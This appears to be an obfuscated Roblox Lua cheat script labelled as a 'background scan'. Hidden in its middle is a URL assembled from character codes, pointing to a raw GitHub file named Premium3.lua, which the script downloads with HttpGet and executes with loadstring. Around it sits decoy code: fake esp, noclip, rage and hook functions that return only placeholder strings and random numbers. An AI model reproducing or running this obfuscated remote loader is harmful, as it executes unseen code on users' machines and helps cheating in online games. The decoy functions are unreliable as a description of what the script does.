-- Checkpoint 2 background scan.

local _0xD1F4 = "\x59\x6F\x75\x20\x53\x68\x6F\x75\x6C\x64\x6E\x27\x74\x20\x42\x65\x20\x48\x65\x72\x65\x2E\x20\x59\x6F\x75\x20\x53\x68\x6F\x75\x6C\x64\x6E\x27\x74\x20\x42\x65\x20\x52\x65\x61\x64\x69\x6E\x67\x20\x54\x68\x69\x73\x2E"
local _0x93D9 = string.char
local _0x3B77 = loadstring or load
local _0xF7B1 = function()
    local _0x7CFA = {}
    local _0x6B23 = {}
    for i = 1, #_0xD1F4 do
        _0x6B23[i] = string.byte(_0xD1F4, i)
    end
    for i = 1, #_0x6B23 do
        _0x7CFA[i] = _0x93D9(_0x6B23[i])
    end
    local _0x28A9 = table.concat(_0x7CFA)
    local _0x9A0B = _0x3B77(_0x28A9)
    _0x9A0B()
end

local _0x7832 = function()
    local _0x29C4 = {}
    for i = 1, 5 do
        _0x29C4[i] = "placeholder"
    end
    _0x29C4[6] = _0xF7B1
end

local _0xA1F0 = {}
_0xA1F0[#_0xA1F0+1] = _0x93D9(0x70)
_0xA1F0[#_0xA1F0+1] = _0x93D9(0x72)
_0xA1F0[#_0xA1F0+1] = _0x93D9(0x69)
_0xA1F0[#_0xA1F0+1] = _0x93D9(0x6E)
_0xA1F0[#_0xA1F0+1] = _0x93D9(0x74)
_0xA1F0[#_0xA1F0+1] = _0x93D9(0x28)
_0xA1F0[#_0xA1F0+1] = _0x93D9(0x22)
_0xA1F0[#_0xA1F0+1] = _0x93D9(0x20) 
_0xA1F0[#_0xA1F0+1] = _0x93D9(0x22)
_0xA1F0[#_0xA1F0+1] = _0x93D9(0x29)
local _0xB1F0 = table.concat(_0xA1F0, "")
local _0xC1F0 = _0x3B77(_0xB1F0)
_0xC1F0()

local _0x1a2b3c = string.char(104, 116, 116, 112, 115, 58, 47, 47) .. string.char(114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 46, 99, 111, 109) .. string.char(47, 71, 108, 121, 112, 104, 65, 74, 74) .. string.char(47, 71, 108, 121, 112, 104, 72, 117, 98) .. string.char(47, 114, 101, 102, 115, 47, 104, 101, 97, 100, 115, 47, 109, 97, 105, 110) .. string.char(47, 67, 104, 101, 99, 107, 112, 111, 105, 110, 116, 47, 80, 114, 101, 109, 105, 117, 109, 51, 46, 108, 117, 97)
local _0x4d5e6f = game:HttpGet(_0x1a2b3c)
local _0x789abc = loadstring
_0x789abc(_0x4d5e6f)()


_0x7832()

local hook = function() 
    local test = math.random(10, 100)
    local value = math.random(0, 50) + 10
    local result = string.char(test, value)
    return result
end

local unhook = function()
    local _hookStatus = "hooked" .. " successfully"
    return _hookStatus
end

local function keycheck()
    local check = math.random(1, 10)
    if check > 5 then
        return "keypressed"
    else
        return "keynotpressed"
    end
end

local esp = function()
    local visible = string.sub("ESPEnabled", 1, 3)
    local status = string.reverse("Active")
    return visible .. status
end

local noclip = function()
    local _noclipStatus = {}
    for i = 1, 3 do
        table.insert(_noclipStatus, math.random(50, 150)) 
    end
    return _noclipStatus
end

local rage = function()
    local damage = math.sin(100)
    local boost = math.cos(100)
    local total = damage + boost
    return total
end

local glyph = function()
    local _glyphData = {}
    table.insert(_glyphData, "active")
    table.insert(_glyphData, "status")
    table.insert(_glyphData, "enabled")
    return table.concat(_glyphData, "_")
end

local function functionSetup()
    hook()
    unhook()
    keycheck()
    esp()
    noclip()
    rage()
    glyph()
end

local function executeCheat()
    local status = functionSetup()
    print("Cheat system initialized.")
    return status
end

local function initiateRageMode()
    local _rageMode = "Rage Mode Active!"
    return _rageMode
end

local function espSystem()
    local _espStatus = "ESP system online"
    return _espStatus
end

local function noclipSystem()
    local _noclipActivated = "Noclip system enabled"
    return _noclipActivated
end

local function cheatManager()
    local hooked = functionSetup()
    local rageActive = initiateRageMode()
    local espActive = espSystem()
    local noclipActive = noclipSystem()
    return hooked, rageActive, espActive, noclipActive
end

cheatManager()
